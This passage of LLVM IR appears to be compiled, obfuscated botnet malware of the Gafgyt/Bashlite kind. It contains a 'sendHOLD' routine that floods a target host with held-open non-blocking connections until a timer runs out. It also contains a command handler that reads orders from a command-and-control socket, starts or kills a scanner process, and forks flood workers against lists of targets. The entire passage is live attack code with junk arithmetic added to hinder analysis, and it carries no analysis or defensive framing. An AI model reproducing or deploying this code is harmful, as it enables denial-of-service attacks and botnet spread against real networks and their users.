  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %186, i32 0, i32 1
  store i8 2, i8* %187, align 4
  br label %188

; <label>:188:                                    ; preds = %183, %172
  br label %204

; <label>:189:                                    ; preds = %125
  %190 = load i32, i32* %15, align 4
  %191 = icmp eq i32 %190, -1
  br i1 %191, label %192, label %203

; <label>:192:                                    ; preds = %189
  %193 = load i32, i32* %8, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %194
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 8
  %198 = call i32 @close(i32 %197)
  %199 = load i32, i32* %8, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %200
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %201, i32 0, i32 1
  store i8 0, i8* %202, align 4
  br label %203

; <label>:203:                                    ; preds = %192, %189
  br label %204

; <label>:204:                                    ; preds = %203, %188
  br label %231

; <label>:205:                                    ; preds = %60
  %206 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %206, i32 1024)
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = load i8*, i8** %16, align 8
  %213 = call i64 @send(i32 %211, i8* %212, i64 1024, i32 16384)
  %214 = icmp eq i64 %213, -1
  br i1 %214, label %215, label %230

; <label>:215:                                    ; preds = %205
  %216 = call i32* @__errno_location() #13
  %217 = load i32, i32* %216, align 4
  %218 = icmp ne i32 %217, 11
  br i1 %218, label %219, label %230

; <label>:219:                                    ; preds = %215
  %220 = load i32, i32* %8, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %221
  %223 = getelementptr inbounds %struct.state_t, %struct.state_t* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 8
  %225 = call i32 @close(i32 %224)
  %226 = load i32, i32* %8, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %227
  %229 = getelementptr inbounds %struct.state_t, %struct.state_t* %228, i32 0, i32 1
  store i8 0, i8* %229, align 4
  br label %230

; <label>:230:                                    ; preds = %219, %215, %205
  br label %231

; <label>:231:                                    ; preds = %230, %204, %113, %60
  br label %232

; <label>:232:                                    ; preds = %231
  %233 = load i32, i32* %8, align 4
  %234 = sub i32 0, 1
  %235 = sub i32 %233, %234
  %236 = add nsw i32 %233, 1
  store i32 %235, i32* %8, align 4
  br label %56

; <label>:237:                                    ; preds = %56
  br label %51

; <label>:238:                                    ; preds = %51
  %239 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %239)
  br label %240

; <label>:240:                                    ; preds = %238, %31
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %314

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = add i32 %47, -389444638
  %50 = add i32 %49, %48
  %51 = sub i32 %50, -389444638
  %52 = add nsw i32 %47, %48
  store i32 %51, i32* %17, align 4
  br label %53

; <label>:53:                                     ; preds = %311, %34
  %54 = load i32, i32* %17, align 4
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = icmp sgt i32 %54, %55
  br i1 %56, label %57, label %312

; <label>:57:                                     ; preds = %53
  store i32 0, i32* %8, align 4
  br label %58

; <label>:58:                                     ; preds = %304, %57
  %59 = load i32, i32* %8, align 4
  %60 = load i32, i32* %7, align 4
  %61 = icmp slt i32 %59, %60
  br i1 %61, label %62, label %311

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %8, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %64
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %65, i32 0, i32 1
  %67 = load i8, i8* %66, align 4
  %68 = zext i8 %67 to i32
  switch i32 %68, label %303 [
    i32 0, label %69
    i32 1, label %128
    i32 2, label %231
  ]

; <label>:69:                                     ; preds = %62
  %70 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %72
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %73, i32 0, i32 0
  store i32 %70, i32* %74, align 8
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %76
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %77, i32 0, i32 0
  %79 = load i32, i32* %78, align 8
  %80 = load i32, i32* %8, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %81
  %83 = getelementptr inbounds %struct.state_t, %struct.state_t* %82, i32 0, i32 0
  %84 = load i32, i32* %83, align 8
  %85 = call i32 (i32, i32, ...) @fcntl(i32 %84, i32 3, i8* null)
  %86 = xor i32 %85, -1
  %87 = xor i32 2048, -1
  %88 = xor i32 1394680849, -1
  %89 = and i32 %86, 1394680849
  %90 = and i32 %85, %88
  %91 = and i32 %87, 1394680849
  %92 = and i32 2048, %88
  %93 = or i32 %89, %90
  %94 = or i32 %91, %92
  %95 = xor i32 %93, %94
  %96 = or i32 %86, %87
  %97 = xor i32 %96, -1
  %98 = or i32 1394680849, %88
  %99 = and i32 %97, %98
  %100 = or i32 %95, %99
  %101 = or i32 %85, 2048
  %102 = call i32 (i32, i32, ...) @fcntl(i32 %79, i32 4, i32 %100)
  %103 = load i32, i32* %8, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %104
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 8
  %108 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %109 = call i32 @connect(i32 %107, %struct.sockaddr* %108, i32 16)
  %110 = icmp ne i32 %109, -1
  br i1 %110, label %115, label %111

; <label>:111:                                    ; preds = %69
  %112 = call i32* @__errno_location() #13
  %113 = load i32, i32* %112, align 4
  %114 = icmp ne i32 %113, 115
  br i1 %114, label %115, label %122

; <label>:115:                                    ; preds = %111, %69
  %116 = load i32, i32* %8, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %117
  %119 = getelementptr inbounds %struct.state_t, %struct.state_t* %118, i32 0, i32 0
  %120 = load i32, i32* %119, align 8
  %121 = call i32 @close(i32 %120)
  br label %127

; <label>:122:                                    ; preds = %111
  %123 = load i32, i32* %8, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %124
  %126 = getelementptr inbounds %struct.state_t, %struct.state_t* %125, i32 0, i32 1
  store i8 1, i8* %126, align 4
  br label %127

; <label>:127:                                    ; preds = %122, %115
  br label %303

; <label>:128:                                    ; preds = %62
  br label %129

; <label>:129:                                    ; preds = %128
  %130 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %131 = getelementptr inbounds [16 x i64], [16 x i64]* %130, i64 0, i64 0
  %132 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %131) #2, !srcloc !7
  %133 = extractvalue { i64, i64* } %132, 0
  %134 = extractvalue { i64, i64* } %132, 1
  %135 = trunc i64 %133 to i32
  store i32 %135, i32* %18, align 4
  %136 = ptrtoint i64* %134 to i64
  %137 = trunc i64 %136 to i32
  store i32 %137, i32* %19, align 4
  br label %138

; <label>:138:                                    ; preds = %129
  br label %139

; <label>:139:                                    ; preds = %138
  %140 = load i32, i32* %8, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %141
  %143 = getelementptr inbounds %struct.state_t, %struct.state_t* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 8
  %145 = srem i32 %144, 64
  %146 = zext i32 %145 to i64
  %147 = shl i64 1, %146
  %148 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %149 = load i32, i32* %8, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %150
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %151, i32 0, i32 0
  %153 = load i32, i32* %152, align 8
  %154 = sdiv i32 %153, 64
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds [16 x i64], [16 x i64]* %148, i64 0, i64 %155
  %157 = load i64, i64* %156, align 8
  %158 = xor i64 %157, -1
  %159 = xor i64 %147, -1
  %160 = xor i64 -7551640467482706521, -1
  %161 = and i64 %158, -7551640467482706521
  %162 = and i64 %157, %160
  %163 = and i64 %159, -7551640467482706521
  %164 = and i64 %147, %160
  %165 = or i64 %161, %162
  %166 = or i64 %163, %164
  %167 = xor i64 %165, %166
  %168 = or i64 %158, %159
  %169 = xor i64 %168, -1
  %170 = or i64 -7551640467482706521, %160
  %171 = and i64 %169, %170
  %172 = or i64 %167, %171
  %173 = or i64 %157, %147
  store i64 %172, i64* %156, align 8
  %174 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %174, align 8
  %175 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %175, align 8
  %176 = load i32, i32* %8, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %177
  %179 = getelementptr inbounds %struct.state_t, %struct.state_t* %178, i32 0, i32 0
  %180 = load i32, i32* %179, align 8
  %181 = add i32 %180, -1638491654
  %182 = add i32 %181, 1
  %183 = sub i32 %182, -1638491654
  %184 = add nsw i32 %180, 1
  %185 = call i32 @select(i32 %183, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %185, i32* %15, align 4
  %186 = load i32, i32* %15, align 4
  %187 = icmp eq i32 %186, 1
  br i1 %187, label %188, label %215

; <label>:188:                                    ; preds = %139
  store i32 4, i32* %13, align 4
  %189 = load i32, i32* %8, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %190
  %192 = getelementptr inbounds %struct.state_t, %struct.state_t* %191, i32 0, i32 0
  %193 = load i32, i32* %192, align 8
  %194 = bitcast i32* %14 to i8*
  %195 = call i32 @getsockopt(i32 %193, i32 1, i32 4, i8* %194, i32* %13) #2
  %196 = load i32, i32* %14, align 4
  %197 = icmp ne i32 %196, 0
  br i1 %197, label %198, label %209

; <label>:198:                                    ; preds = %188
  %199 = load i32, i32* %8, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %200
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %201, i32 0, i32 0
  %203 = load i32, i32* %202, align 8
  %204 = call i32 @close(i32 %203)
  %205 = load i32, i32* %8, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %206
  %208 = getelementptr inbounds %struct.state_t, %struct.state_t* %207, i32 0, i32 1
  store i8 0, i8* %208, align 4
  br label %214

; <label>:209:                                    ; preds = %188
  %210 = load i32, i32* %8, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %211
  %213 = getelementptr inbounds %struct.state_t, %struct.state_t* %212, i32 0, i32 1
  store i8 2, i8* %213, align 4
  br label %214

; <label>:214:                                    ; preds = %209, %198
  br label %230

; <label>:215:                                    ; preds = %139
  %216 = load i32, i32* %15, align 4
  %217 = icmp eq i32 %216, -1
  br i1 %217, label %218, label %229

; <label>:218:                                    ; preds = %215
  %219 = load i32, i32* %8, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %220
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 8
  %224 = call i32 @close(i32 %223)
  %225 = load i32, i32* %8, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %226
  %228 = getelementptr inbounds %struct.state_t, %struct.state_t* %227, i32 0, i32 1
  store i8 0, i8* %228, align 4
  br label %229

; <label>:229:                                    ; preds = %218, %215
  br label %230

; <label>:230:                                    ; preds = %229, %214
  br label %303

; <label>:231:                                    ; preds = %62
  br label %232

; <label>:232:                                    ; preds = %231
  %233 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %234 = getelementptr inbounds [16 x i64], [16 x i64]* %233, i64 0, i64 0
  %235 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %234) #2, !srcloc !8
  %236 = extractvalue { i64, i64* } %235, 0
  %237 = extractvalue { i64, i64* } %235, 1
  %238 = trunc i64 %236 to i32
  store i32 %238, i32* %20, align 4
  %239 = ptrtoint i64* %237 to i64
  %240 = trunc i64 %239 to i32
  store i32 %240, i32* %21, align 4
  br label %241

; <label>:241:                                    ; preds = %232
  br label %242

; <label>:242:                                    ; preds = %241
  %243 = load i32, i32* %8, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %244
  %246 = getelementptr inbounds %struct.state_t, %struct.state_t* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = srem i32 %247, 64
  %249 = zext i32 %248 to i64
  %250 = shl i64 1, %249
  %251 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %252 = load i32, i32* %8, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %253
  %255 = getelementptr inbounds %struct.state_t, %struct.state_t* %254, i32 0, i32 0
  %256 = load i32, i32* %255, align 8
  %257 = sdiv i32 %256, 64
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds [16 x i64], [16 x i64]* %251, i64 0, i64 %258
  %260 = load i64, i64* %259, align 8
  %261 = xor i64 %260, -1
  %262 = xor i64 %250, -1
  %263 = xor i64 5731142193779257783, -1
  %264 = and i64 %261, 5731142193779257783
  %265 = and i64 %260, %263
  %266 = and i64 %262, 5731142193779257783
  %267 = and i64 %250, %263
  %268 = or i64 %264, %265
  %269 = or i64 %266, %267
  %270 = xor i64 %268, %269
  %271 = or i64 %261, %262
  %272 = xor i64 %271, -1
  %273 = or i64 5731142193779257783, %263
  %274 = and i64 %272, %273
  %275 = or i64 %270, %274
  %276 = or i64 %260, %250
  store i64 %275, i64* %259, align 8
  %277 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %277, align 8
  %278 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %278, align 8
  %279 = load i32, i32* %8, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %280
  %282 = getelementptr inbounds %struct.state_t, %struct.state_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 8
  %284 = sub i32 %283, 1256526972
  %285 = add i32 %284, 1
  %286 = add i32 %285, 1256526972
  %287 = add nsw i32 %283, 1
  %288 = call i32 @select(i32 %286, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %288, i32* %15, align 4
  %289 = load i32, i32* %15, align 4
  %290 = icmp ne i32 %289, 0
  br i1 %290, label %291, label %302

; <label>:291:                                    ; preds = %242
  %292 = load i32, i32* %8, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %293
  %295 = getelementptr inbounds %struct.state_t, %struct.state_t* %294, i32 0, i32 0
  %296 = load i32, i32* %295, align 8
  %297 = call i32 @close(i32 %296)
  %298 = load i32, i32* %8, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %299
  %301 = getelementptr inbounds %struct.state_t, %struct.state_t* %300, i32 0, i32 1
  store i8 0, i8* %301, align 4
  br label %302

; <label>:302:                                    ; preds = %291, %242
  br label %303

; <label>:303:                                    ; preds = %302, %230, %127, %62
  br label %304

; <label>:304:                                    ; preds = %303
  %305 = load i32, i32* %8, align 4
  %306 = sub i32 0, %305
  %307 = sub i32 0, 1
  %308 = add i32 %306, %307
  %309 = sub i32 0, %308
  %310 = add nsw i32 %305, 1
  store i32 %309, i32* %8, align 4
  br label %58

; <label>:311:                                    ; preds = %58
  br label %53

; <label>:312:                                    ; preds = %53
  %313 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %313)
  br label %314

; <label>:314:                                    ; preds = %312, %33
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %32 = load i8**, i8*** %4, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0)) #10
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %40, label %37

; <label>:37:                                     ; preds = %2
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = call i32 (i32, i8*, ...) @sockprintf(i32 %38, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.43, i32 0, i32 0))
  br label %528

; <label>:40:                                     ; preds = %2
  %41 = load i8**, i8*** %4, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @strcmp(i8* %43, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i32 0, i32 0)) #10
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %51, label %46

; <label>:46:                                     ; preds = %40
  %47 = load i32, i32* @mainCommSock, align 4
  %48 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %49 = call i8* @inet_ntoa(i32 %48) #2
  %50 = call i32 (i32, i8*, ...) @sockprintf(i32 %47, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.45, i32 0, i32 0), i8* %49)
  br label %528

; <label>:51:                                     ; preds = %40
  %52 = load i8**, i8*** %4, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 0
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @strcmp(i8* %54, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.46, i32 0, i32 0)) #10
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %101, label %57

; <label>:57:                                     ; preds = %51
  %58 = load i32, i32* %3, align 4
  %59 = icmp ne i32 %58, 2
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %57
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.47, i32 0, i32 0))
  br label %528

; <label>:63:                                     ; preds = %57
  %64 = load i8**, i8*** %4, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 1
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @strcmp(i8* %66, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i32 0, i32 0)) #10
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %77, label %69

; <label>:69:                                     ; preds = %63
  %70 = load i32, i32* @scanPid, align 4
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %69
  br label %528

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* @scanPid, align 4
  %75 = call i32 @kill(i32 %74, i32 9) #2
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.49, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  br label %77

; <label>:77:                                     ; preds = %73, %63
  %78 = load i8**, i8*** %4, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 1
  %80 = load i8*, i8** %79, align 8
  %81 = call i32 @strcmp(i8* %80, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.50, i32 0, i32 0)) #10
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %100, label %83

; <label>:83:                                     ; preds = %77
  %84 = load i32, i32* @scanPid, align 4
  %85 = icmp ne i32 %84, 0
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %83
  br label %528

; <label>:87:                                     ; preds = %83
  %88 = call i32 @fork() #2
  store i32 %88, i32* %6, align 4
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.51, i32 0, i32 0))
  %90 = load i32, i32* %6, align 4
  %91 = icmp ugt i32 %90, 0
  br i1 %91, label %92, label %94

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %6, align 4
  store i32 %93, i32* @scanPid, align 4
  br label %528

; <label>:94:                                     ; preds = %87
  %95 = load i32, i32* %6, align 4
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %94
  br label %528

; <label>:98:                                     ; preds = %94
  br label %99

; <label>:99:                                     ; preds = %98
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:100:                                    ; preds = %77
  br label %101

; <label>:101:                                    ; preds = %100, %51
  %102 = load i8**, i8*** %4, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 0
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @strcmp(i8* %104, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.52, i32 0, i32 0)) #10
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %163, label %107

; <label>:107:                                    ; preds = %101
  %108 = load i32, i32* %3, align 4
  %109 = icmp slt i32 %108, 4
  br i1 %109, label %122, label %110

; <label>:110:                                    ; preds = %107
  %111 = load i8**, i8*** %4, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 2
  %113 = load i8*, i8** %112, align 8
  %114 = call i32 @atoi(i8* %113) #10
  %115 = icmp slt i32 %114, 1
  br i1 %115, label %122, label %116

; <label>:116:                                    ; preds = %110
  %117 = load i8**, i8*** %4, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 3
  %119 = load i8*, i8** %118, align 8
  %120 = call i32 @atoi(i8* %119) #10
  %121 = icmp slt i32 %120, 1
  br i1 %121, label %122, label %123

; <label>:122:                                    ; preds = %116, %110, %107
  br label %528

; <label>:123:                                    ; preds = %116
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 1
  %126 = load i8*, i8** %125, align 8
  store i8* %126, i8** %7, align 8
  %127 = load i8**, i8*** %4, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 2
  %129 = load i8*, i8** %128, align 8
  %130 = call i32 @atoi(i8* %129) #10
  store i32 %130, i32* %8, align 4
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 3
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* %133) #10
  store i32 %134, i32* %9, align 4
  %135 = load i8*, i8** %7, align 8
  %136 = call i8* @strstr(i8* %135, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #10
  %137 = icmp ne i8* %136, null
  br i1 %137, label %138, label %154

; <label>:138:                                    ; preds = %123
  %139 = load i8*, i8** %7, align 8
  %140 = call i8* @strtok(i8* %139, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %140, i8** %10, align 8
  br label %141

; <label>:141:                                    ; preds = %151, %138
  %142 = load i8*, i8** %10, align 8
  %143 = icmp ne i8* %142, null
  br i1 %143, label %144, label %153

; <label>:144:                                    ; preds = %141
  %145 = call i32 @listFork()
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %151, label %147

; <label>:147:                                    ; preds = %144
  %148 = load i8*, i8** %10, align 8
  %149 = load i32, i32* %8, align 4
  %150 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %148, i32 %149, i32 %150)
  call void @_exit(i32 0) #12
  unreachable

; <label>:151:                                    ; preds = %144
  %152 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %152, i8** %10, align 8
  br label %141

; <label>:153:                                    ; preds = %141
  br label %162

; <label>:154:                                    ; preds = %123
  %155 = call i32 @listFork()
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %157, label %158

; <label>:157:                                    ; preds = %154
  br label %528

; <label>:158:                                    ; preds = %154
  %159 = load i8*, i8** %7, align 8
  %160 = load i32, i32* %8, align 4
  %161 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %159, i32 %160, i32 %161)
  call void @_exit(i32 0) #12
  unreachable

; <label>:162:                                    ; preds = %153
  br label %163

; <label>:163:                                    ; preds = %162, %101
  %164 = load i8**, i8*** %4, align 8
  %165 = getelementptr inbounds i8*, i8** %164, i64 0
  %166 = load i8*, i8** %165, align 8
  %167 = call i32 @strcmp(i8* %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0)) #10
  %168 = icmp ne i32 %167, 0
  br i1 %168, label %227, label %169

; <label>:169:                                    ; preds = %163
  %170 = load i32, i32* %3, align 4
